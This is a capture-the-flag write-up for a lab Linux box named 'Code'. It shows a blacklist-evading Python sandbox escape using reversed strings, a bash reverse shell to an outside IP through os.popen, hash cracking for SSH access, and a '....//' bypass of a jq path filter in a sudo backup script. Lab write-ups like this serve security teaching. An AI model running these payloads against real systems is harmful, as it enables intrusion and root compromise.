+++
date = '2026-09-14T17:27:00+02:00'
draft = false
title = 'Code Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`11/09/2026`**

![pwn.png](/images/imgs_code/pwn.png)

---
# Introduction

**_Code_** is an **Easy-level Linux** box that focuses on web application testing, specifically evading a restricted **Python** sandbox environment.

The exploitation path begins by interacting with a custom **Python Code Editor** on port **5000**. The application filters dangerous keywords, requiring a creative bypass using **Python** built-in functions and string slicing to achieve **Remote Code Execution** (**RCE**). After gaining initial access as app-production, lateral movement is achieved by enumerating a local **SQLite** database and cracking a user hash. The final step involves a Privilege Escalation vector where a custom bash backup script is vulnerable to **path traversal** due to an incomplete jq regex filter, allowing the extraction of the **root** directory.

---
# Techniques Used

- **Python Sandbox Evasion**

- **String Slicing & Built-in Abuses**

- **SQLite Database Enumeration**

- **Hash Cracking**

- **Path Traversal / Regex Bypass**

---
# Enumeration
## nmap

Initial scan on all ports:

```bash
nmap -p- code 
```

```text
PORT      STATE    SERVICE
22/tcp    open     ssh
2499/tcp  filtered unicontrol
5000/tcp  open     upnp
7081/tcp  filtered unknown
12523/tcp filtered unknown
56712/tcp filtered unknown                                                60359/tcp filtered unknown
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV code
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:

- **22**/tcp - SSH

- **5000**/tcp - Web (Gunicorn / Python Code Editor)

---
# Initial Access | Python Sandbox Evasion

Browsing to port **5000** revealed a web application acting as a "**Python Code Editor**". It functioned like an online interpreter, taking input and evaluating it.

![web1.png](/images/imgs_code/web1.png)

I attempted a standard **Python** command injection:

```Python
command = input("Enter a command to execute: ")
os.system(command)
```

The server rejected it with a specific error message:

```text
Use of restricted keywords is not allowed.
```

![restricted.png](/images/imgs_code/restricted.png)

This error indicated that the application wasn't using a secure, isolated sandbox, but rather a simple text-based blacklist (input sanitization) that filtered out specific dangerous strings. To bypass this, I needed to understand exactly what was blacklisted. I started fuzzing the input manually:

**`import os`** ➔ **Blocked**

**`import`** ➔ **Blocked**

**`os`** ➔ **Blocked**

**`read`** ➔ **Blocked**

**`print`** ➔ **Allowed**

Since **`print`** was allowed, I realized I could use it to introspect the environment. My goal was to find a way to access restricted modules without typing their explicit names. To do this, I executed **`print(globals())`**.

**Note**: _The **`globals()`** function in **Python** returns a dictionary representing the current global symbol table. If I can access this dictionary, I can potentially call **built-in** functions or access modules by manipulating strings as dictionary keys, rather than using the raw keywords that trigger the blacklist._

The output confirmed **`globals()`** was working. Now, I needed to load the **`os`** module. Since the raw string "**os**" was caught by the filter, I had to construct it dynamically during execution so the static filter wouldn't detect it in my payload.

I achieved this using **Python**'s string slicing:

```python
print(globals()['so'[::-1]])
```

![bypass.png](/images/imgs_code/bypass.png)

With **`os`** loaded, I saved it to a variable and applied the exact same reversal technique to access the `**popen`** attribute (reversed as '**nepop**'), avoiding the blacklist once again:

```python
so = (globals()['so'[::-1]])
p0pen = (getattr(so, 'nepop'[::-1]))
```

Finally, I needed to read the output of the executed command. The word **`read`** was also blacklisted, so I applied the string slicing trick one last time. I tested it with the **`id`** command:

```python
so = (globals()['so'[::-1]])
p0pen = (getattr(so, 'nepop'[::-1]))
print(getattr(p0pen('id'), 'daer'[::-1])())
```

![execution.png](/images/imgs_code/execution.png)

Then, I swapped the **`id`** command with a **bash reverse shell payload**, set up a **netcat** listener, and executed the flow:

```python
so = (globals()['so'[::-1]])
p0pen = (getattr(so, 'nepop'[::-1]))
print(getattr(p0pen('bash -c "bash -i >& /dev/tcp/10.10.15.152/22667 0>&1"'), 'daer'[::-1])())
```

![initial_access.png](/images/imgs_code/initial_access.png)

I caught the shell as **`app-production`** and retrieved the **user flag**.

![userf.png](/images/imgs_code/userf.png)

---
# Lateral Movement | SQLite to SSH

Inside the **`app-production`** home directory, I found the web application files. Digging into the **`app/instance`** directory, I discovered an **SQLite** database file.

![db.png](/images/imgs_code/db.png)

Using the **sqlite3** command-line tool, I dumped the database and retrieved two hashes:

![db1.png](/images/imgs_code/db1.png)

I cracked the hashes (in this case using **Crackstation**).

- https://crackstation.net/

![station.png](/images/imgs_code/station.png)

I used the valid credentials to **SSH** into the machine as the user **`martin`**.

---
# Privilege Escalation | Path Traversal via Incomplete Filter

Once logged in as **`martin`**, I checked for **sudo** privileges:

```bash
sudo -l
```

![sudol.png](/images/imgs_code/sudol.png)

I had permissions to run a backup script without a password. Executing it without arguments showed the expected usage:

```text
Usage: /usr/bin/backy.sh <task.json>
```

I located a **`task.json`** file inside **`/home/martin/backups/`**. 

![priv2.png](/images/imgs_code/priv2.png)

Running **`sudo /usr/bin/backy.sh task.json`** created a backup archive of the directory specified inside the **JSON** object.

![priv1.png](/images/imgs_code/priv1.png)

I analyzed the script to understand how it parsed the **JSON** file:

```bash
cat /usr/bin/backy.sh
```

The script enforced two security controls:  

- **It required the target directory to begin with either `/var` or `/home`**.  

- **It attempted to sanitize path traversal attempts using jq**:  

```bash
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```

**Note**: _The **`gsub("\\.\\./"; "")`** function is flawed. It only searches for and removes the exact sequence **`../`**. By crafting a path like **`....//`**, the filter removes the inner **`../`**, leaving behind a perfectly valid **`../`** that is passed to the system, resulting in a successful **directory traversal**._

To exploit this, I modified **`task.json`** to start with **`/home`** (**satisfying the first check**) and then traverse backward to archive the **`/root`** directory:

![priv3.png](/images/imgs_code/priv3.png)

I executed the script via **sudo**, and it generated an archive named **`code_home_.._root_2026_September.tar.bz2`**.

I unzipped the resulting archive:

```bash
tar -xvf code_home_.._root_2026_September.tar.bz2
```

![priv4.png](/images/imgs_code/priv4.png)

It contained the entirety of the **root** directory. I navigated into the extracted folders and read the **root flag**. 

![rootf.png](/images/imgs_code/rootf.png)

To achieve full interactive system compromise, the **`/root/.ssh/id_rsa`** key could also be extracted from this backup.

---
# Final Thoughts

**_Code_** is a fun and straightforward machine that highlights the dangers of relying on static string blacklisting for security. The **Python sandbox evasion** requires just enough creativity with **built-in** functions to be engaging without becoming tedious. The privilege escalation is a great real-world example of how custom regex filters are notoriously difficult to implement correctly, proving that incomplete sanitization is often just as exploitable as having no sanitization at all.

